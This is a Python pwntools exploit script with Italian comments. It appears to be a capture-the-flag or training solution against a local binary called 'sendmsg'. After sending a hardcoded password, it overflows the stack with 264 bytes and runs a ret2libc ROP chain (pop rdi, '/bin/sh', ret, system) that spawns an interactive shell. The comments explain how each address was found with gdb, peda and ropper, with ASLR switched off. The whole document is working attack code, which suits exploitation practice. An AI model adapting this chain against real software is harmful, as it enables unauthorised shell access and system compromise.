#DA ESEGUIRE SENZA ASLR! /proc/sys/kernel/randomize_va_space DEVE ESSERE 0

from pwn import *

p = process("./sendmsg")

system = 0x7ffff7e18330		#Non essendoci ASLR, apro gdb, faccio x system e prendo il primo indirizzo.
pop_rdi = 0x004013a3		#Da ropper o peda ropsearch "pop rdi"
ret = 0x004013a4		#L'indirizzo dopo pop rdi, cioè un ret. Per allineare lo stack.
bin_sh = 0x7ffff7f62031		#Da peda, find "/bin/sh"

offset = 264			#Da peda pattern create, prendo i primi 8 char sullo stack > pattern offset


#p.recv()
p.sendline(b"StrongPsw")

exploit = b""
exploit += p64(pop_rdi)		#Carico in RDI quello che c'è in cima allo stack. (RDI = Argomento)
exploit += p64(bin_sh)		#Quello che viene caricato in RDI
exploit += p64(ret)		#Per allineare lo stack.
exploit += p64(system)		#La funzione da chiamare, con l'argomento in RDI. system(/bin/sh)

#p.recv()
print(exploit)
p.sendline(b"A" * offset + exploit)

p.interactive()
